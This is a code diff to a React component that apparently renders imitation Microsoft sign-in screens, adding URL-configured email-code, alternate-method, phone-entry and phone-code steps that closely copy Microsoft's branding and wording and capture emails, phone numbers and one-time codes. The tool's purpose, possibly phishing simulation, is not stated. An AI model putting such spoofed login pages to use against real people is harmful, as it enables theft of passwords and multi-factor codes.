@@ -53,7 +53,8 @@ const AppleSpinRing = () => (
 
 // ─── Microsoft types & helpers ────────────────────────────────────────────────
 
-type MsStep = 'email' | 'signin-options' | 'passkey' | 'password' | 'stay' | 'register' | 'recover';
+type MsStep = 'email' | 'signin-options' | 'passkey' | 'password' | 'stay' | 'register' | 'recover'
+  | 'email-code' | 'email-code-input' | 'other-ways' | 'phone-entry' | 'phone-code';
 type RegStep = 'reg-email' | 'reg-password' | 'reg-name' | 'reg-dob' | 'reg-verify';
 type RecStep = 'rec-find' | 'rec-options' | 'rec-code';
 
@@ -111,6 +112,16 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
   const [recCode, setRecCode] = useState('');
   const [recCaptcha, setRecCaptcha] = useState(false);
 
+  // Prompt config from URL
+  const msParams = new URLSearchParams(typeof window !== 'undefined' ? window.location.search : '');
+  const promptType = msParams.get('prompt') || 'password';
+  const phoneEnabled = msParams.get('phone') === '1';
+
+  // Phone / code inputs
+  const [phoneNumber, setPhoneNumber] = useState('');
+  const [phoneCode, setPhoneCode] = useState('');
+  const [emailCodeInput, setEmailCodeInput] = useState('');
+
   // Passkey scanning phase
   const [passkeyPhase, setPasskeyPhase] = useState<'scanning' | 'phone'>('scanning');
 
@@ -138,7 +149,9 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
     backgroundPosition: 'center',
   };
 
-  const isOnDark = step === 'password' || step === 'stay' || step === 'passkey';
+  const isOnDark = step === 'password' || step === 'stay' || step === 'passkey'
+    || step === 'email-code' || step === 'email-code-input' || step === 'other-ways'
+    || step === 'phone-entry' || step === 'phone-code';
   const bg = isOnDark ? darkPageBg : lightBg;
 
   const fadeSlide: MotionProps = {
@@ -197,7 +210,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
                   type="text"
                   value={email}
                   onChange={e => setEmail(e.target.value)}
-                  onKeyDown={e => e.key === 'Enter' && setStep('password')}
+                  onKeyDown={e => { if (e.key === 'Enter') { if (promptType === 'email-code') setStep('email-code'); else if (promptType === 'other-ways') setStep('other-ways'); else setStep('password'); } }}
                   placeholder="Email, phone, or Skype"
                   autoFocus
                   className={lightUnderlineInput}
@@ -215,7 +228,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
               <div className="flex justify-end">
                 <button
                   data-testid="ms-next-btn"
-                  onClick={() => setStep('password')}
+                  onClick={() => { if (promptType === 'email-code') setStep('email-code'); else if (promptType === 'other-ways') setStep('other-ways'); else setStep('password'); }}
                   className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                   style={{ borderRadius: 0 }}
                 >
@@ -456,6 +469,280 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
                   Yes
                 </button>
               </div>
+            </div>
+          </motion.div>
+        )}
+
+        {/* ── Email code ────────────────────────────────────────────────────── */}
+        {step === 'email-code' && (
+          <motion.div key="email-code" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
+            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col items-center`}>
+              <div className="flex items-center gap-2 justify-center mb-5">
+                <MicrosoftLogo />
+                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
+              </div>
+              <button
+                onClick={() => setStep('email')}
+                className="inline-flex items-center gap-1.5 px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px] hover:bg-[#3a3a3a] transition-colors mb-5"
+                style={{ background: 'none' }}
+              >
+                {email || 'user@example.com'}
+              </button>
+              <h1 className="text-[22px] font-bold text-white text-center mb-3">Get a code to sign in</h1>
+              <p className="text-[14px] text-[#aaa] text-center mb-6">
+                We'll send a code to <strong className="text-white">{email || 'your email'}</strong> to sign you in.
+              </p>
+              <button
+                onClick={() => setStep('email-code-input')}
+                className="w-full border border-[#0078D4] text-white bg-[#0078D4] hover:bg-[#005a9e] text-[15px] font-semibold py-2.5 mb-5 transition-colors"
+                style={{ borderRadius: 0 }}
+              >
+                Send code
+              </button>
+              <a href="#" onClick={e => { e.preventDefault(); setStep('other-ways'); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
+                Other ways to sign in
+              </a>
+            </div>
+            {!isMobile && (
+              <div className="flex justify-center gap-5 mt-3 text-[12px] text-[#888]">
+                <a href="#" className="hover:underline hover:text-[#aaa]">Help and feedback</a>
+                <a href="#" className="hover:underline hover:text-[#aaa]">Terms of use</a>
+                <a href="#" className="hover:underline hover:text-[#aaa]">Privacy and cookies</a>
+              </div>
+            )}
+          </motion.div>
+        )}
+
+        {/* ── Email code input ──────────────────────────────────────────────── */}
+        {step === 'email-code-input' && (
+          <motion.div key="email-code-input" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
+            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
+              <div className="flex items-center justify-center gap-2 mb-5">
+                <MicrosoftLogo />
+                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
+              </div>
+              <div className="flex justify-center mb-4">
+                <button
+                  onClick={() => setStep('email-code')}
+                  className="inline-flex items-center gap-1.5 px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px] hover:bg-[#3a3a3a] transition-colors"
+                  style={{ background: 'none' }}
+                >
+                  <ChevronLeft className="w-3.5 h-3.5" />
+                  {email || 'user@example.com'}
+                </button>
+              </div>
+              <h1 className="text-[24px] font-bold text-white text-center mb-2">Enter code</h1>
+              <p className="text-[13px] text-[#aaa] text-center mb-6">
+                Check <strong className="text-white">{email || 'your email'}</strong> for the code and enter it below.
+              </p>
+              <input
+                type="text"
+                value={emailCodeInput}
+                onChange={e => setEmailCodeInput(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                onKeyDown={e => e.key === 'Enter' && emailCodeInput.length === 6 && setStep('stay')}
+                placeholder="Code"
+                maxLength={6}
+                autoFocus
+                className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] focus:outline-none bg-transparent text-white placeholder-gray-500 mb-2 transition-colors text-center tracking-[0.3em] text-[20px]"
+              />
+              <div className="mb-5">
+                <a href="#" className="text-[#3391e0] text-[13px] hover:underline">I didn't get a code</a>
+              </div>
+              <button
+                onClick={() => emailCodeInput.length === 6 && setStep('stay')}
+                className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-50 text-white text-[15px] font-semibold py-2.5 transition-colors"
+                style={{ borderRadius: 0 }}
+              >
+                Next
+              </button>
+            </div>
+          </motion.div>
+        )}
+
+        {/* ── Other ways ────────────────────────────────────────────────────── */}
+        {step === 'other-ways' && (
+          <motion.div key="other-ways" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
+            <div className={`px-10 pt-9 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
+              <div className="flex items-center mb-5">
+                <button
+                  onClick={() => promptType === 'other-ways' ? setStep('email') : setStep('email-code')}
+                  className="text-[#aaa] hover:text-white transition-colors p-0.5 -ml-0.5"
+                  style={{ background: 'none', border: 'none', cursor: 'pointer' }}
+                >
+                  <ChevronLeft className="w-5 h-5" />
+                </button>
+                <div className="flex-1 flex items-center justify-center gap-2">
+                  <MicrosoftLogo />
+                  {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
+                </div>
+                <div className="w-6" />
+              </div>
+              <div className="flex justify-center mb-4">
+                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
+                  {email || 'user@example.com'}
+                </div>
+              </div>
+              <h1 className="text-[22px] font-bold text-white text-center mb-5">Sign in another way</h1>
+              <div className="border border-[#444] divide-y divide-[#444] mb-5">
+                {/* Password */}
+                <button
+                  onClick={() => setStep('password')}
+                  className="w-full flex items-center gap-3 px-4 py-3.5 text-left hover:bg-[#333] transition-colors"
+                >
+                  <div className="w-8 h-8 flex items-center justify-center flex-shrink-0">
+                    <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
+                      <rect x="3" y="11" width="18" height="10" rx="2" stroke="#aaa" strokeWidth="1.5"/>
+                      <path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="#aaa" strokeWidth="1.5" strokeLinecap="round"/>
+                    </svg>
+                  </div>
+                  <span className="text-[14px] text-white underline underline-offset-2">Use your password</span>
+                </button>
+                {/* Email code */}
+                <button
+                  onClick={() => setStep('email-code-input')}
+                  className="w-full flex items-center gap-3 px-4 py-3.5 text-left hover:bg-[#333] transition-colors"
+                >
+                  <div className="w-8 h-8 flex items-center justify-center flex-shrink-0">
+                    <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
+                      <rect x="2" y="4" width="20" height="16" rx="2" stroke="#aaa" strokeWidth="1.5"/>
+                      <path d="m2 7 10 6 10-6" stroke="#aaa" strokeWidth="1.5"/>
+                    </svg>
+                  </div>
+                  <span className="text-[14px] text-[#ddd]">Send a code to <span className="text-white">{email || 'your email'}</span></span>
+                </button>
+                {/* Phone — only if admin enabled it */}
+                {phoneEnabled && (
+                  <button
+                    onClick={() => setStep('phone-code')}
+                    className="w-full flex items-center gap-3 px-4 py-3.5 text-left hover:bg-[#333] transition-colors"
+                  >
+                    <div className="w-8 h-8 flex items-center justify-center flex-shrink-0">
+                      <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
+                        <rect x="5" y="2" width="14" height="20" rx="2" stroke="#aaa" strokeWidth="1.5"/>
+                        <circle cx="12" cy="18" r="1" fill="#aaa"/>
+                      </svg>
+                    </div>
+                    <span className="text-[14px] text-white underline underline-offset-2">Send a code to ●●●●●●09</span>
+                  </button>
+                )}
+              </div>
+              {/* Show more options → leads to phone entry (only when phone not pre-configured) */}
+              {!phoneEnabled && (
+                <button
+                  onClick={() => setStep('phone-entry')}
+                  className="w-full border border-[#555] text-[#ccc] text-[14px] py-2.5 hover:bg-[#333] transition-colors mb-4"
+                  style={{ borderRadius: 0 }}
+                >
+                  Show more options
+                </button>
+              )}
+              {phoneEnabled && (
+                <div className="flex justify-center">
+                  <a href="#" className="text-[#3391e0] text-[13px] hover:underline">Update your password instead</a>
+                </div>
+              )}
+            </div>
+            {!isMobile && (
+              <div className="flex justify-center gap-5 mt-3 text-[12px] text-[#888]">
+                <a href="#" className="hover:underline hover:text-[#aaa]">Help and feedback</a>
+                <a href="#" className="hover:underline hover:text-[#aaa]">Terms of use</a>
+                <a href="#" className="hover:underline hover:text-[#aaa]">Privacy and cookies</a>
+              </div>
+            )}
+          </motion.div>
+        )}
+
+        {/* ── Phone entry ───────────────────────────────────────────────────── */}
+        {step === 'phone-entry' && (
+          <motion.div key="phone-entry" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
+            <div className={`px-10 pt-9 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
+              <div className="flex items-center mb-5">
+                <button
+                  onClick={() => setStep('other-ways')}
+                  className="text-[#aaa] hover:text-white transition-colors p-0.5 -ml-0.5"
+                  style={{ background: 'none', border: 'none', cursor: 'pointer' }}
+                >
+                  <ChevronLeft className="w-5 h-5" />
+                </button>
+                <div className="flex-1 flex items-center justify-center gap-2">
+                  <MicrosoftLogo />
+                  {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
+                </div>
+                <div className="w-6" />
+              </div>
+              <div className="flex justify-center mb-4">
+                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
+                  {email || 'user@example.com'}
+                </div>
+              </div>
+              <h1 className="text-[22px] font-bold text-white text-center mb-2">Sign in with a code</h1>
+              <p className="text-[13px] text-[#aaa] text-center mb-6">
+                Enter your phone number and we'll send you a 6-digit code.
+              </p>
+              <div className="flex mb-5">
+                <div className="flex items-center border border-[#555] border-r-0 px-3 bg-[#333] text-[#ccc] text-[14px] flex-shrink-0 select-none">
+                  +1
+                </div>
+                <input
+                  type="tel"
+                  value={phoneNumber}
+                  onChange={e => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
+                  onKeyDown={e => e.key === 'Enter' && phoneNumber.length >= 7 && setStep('phone-code')}
+                  placeholder="Phone number"
+                  autoFocus
+                  className="flex-1 px-3 py-2.5 border border-[#555] focus:border-[#0078D4] focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors"
+                />
+              </div>
+              <button
+                onClick={() => phoneNumber.length >= 7 && setStep('phone-code')}
+                className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
+                style={{ borderRadius: 0 }}
+              >
+                Next
+              </button>
+            </div>
+          </motion.div>
+        )}
+
+        {/* ── Phone code ────────────────────────────────────────────────────── */}
+        {step === 'phone-code' && (
+          <motion.div key="phone-code" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
+            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
+              <div className="flex items-center justify-center gap-2 mb-5">
+                <MicrosoftLogo />
+                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
+              </div>
+              <div className="flex justify-center mb-4">
+                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
+                  {email || 'user@example.com'}
+                </div>
+              </div>
+              <h1 className="text-[22px] font-bold text-white text-center mb-2">Enter code</h1>
+              <p className="text-[13px] text-[#aaa] text-center mb-6">
+                {phoneNumber
+                  ? <>We sent a code to <strong className="text-white">+1 ●●●●●●{phoneNumber.slice(-2)}</strong>.</>
+                  : <>We sent a code to your <strong className="text-white">phone (●●●●●●09)</strong>.</>}
+              </p>
+              <input
+                type="text"
+                value={phoneCode}
+                onChange={e => setPhoneCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                onKeyDown={e => e.key === 'Enter' && phoneCode.length === 6 && setStep('stay')}
+                placeholder="Code"
+                maxLength={6}
+                autoFocus
+                className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] focus:outline-none bg-transparent text-white placeholder-gray-500 mb-2 transition-colors text-center tracking-[0.3em] text-[20px]"
+              />
+              <div className="mb-5">
+                <a href="#" className="text-[#3391e0] text-[13px] hover:underline">I didn't get a code</a>
+              </div>
+              <button
+                onClick={() => phoneCode.length === 6 && setStep('stay')}
+                className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
+                style={{ borderRadius: 0 }}
+              >
+                Next
+              </button>
             </div>
           </motion.div>
         )}
